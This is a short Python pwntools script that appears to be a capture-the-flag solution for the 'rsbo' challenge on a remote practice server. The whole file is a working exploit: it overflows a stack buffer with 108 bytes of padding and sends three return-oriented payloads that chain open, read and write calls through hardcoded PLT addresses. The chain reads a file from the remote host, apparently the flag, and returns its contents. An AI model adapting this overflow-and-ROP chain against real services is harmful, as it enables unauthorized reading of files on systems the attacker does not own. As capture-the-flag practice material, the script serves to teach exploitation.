#!/usr/bin/python

from pwn import *

def send(payload):
    global s
    s.send(payload)
    sleep(1)

filename        = 0x80487d0
open_plt        = 0x8048420
read_plt        = 0x80483e0
write_plt       = 0x8048450
buf             = 0x804a100
_start          = 0x8048490
pop_edi_ebp     = 0x804879e
pop_esi_edi_ebp = 0x804879d
pad = "\x00"*108


config = '''
b *0x080486a0
b *0x8048733
'''
#context.log_level = 'debug'
#s = process("./rsbo")
#gdb.attach(s, config)
s = remote('hackme.inndy.tw', 7706)

###Steps: open, read, write file
#open
payload = pad
payload += p32(open_plt)
payload += p32(_start)
payload += p32(filename)
payload += p32(0)
send(payload)
raw_input('[Opening...]')

#read
payload = pad
payload += p32(read_plt)
payload += p32(_start)
payload += p32(3)
payload += p32(buf)
payload += p32(1024)
send(payload)
raw_input('[Reading...]')

#write
payload = pad
payload += p32(write_plt)
payload += p32(_start)
payload += p32(1)
payload += p32(buf)
payload += p32(1024)
s.send(payload)
raw_input('[Writing...]')

#flag = s.recvline()
#log.success('FLAG: ' + flag)
#s.close()
s.interactive()
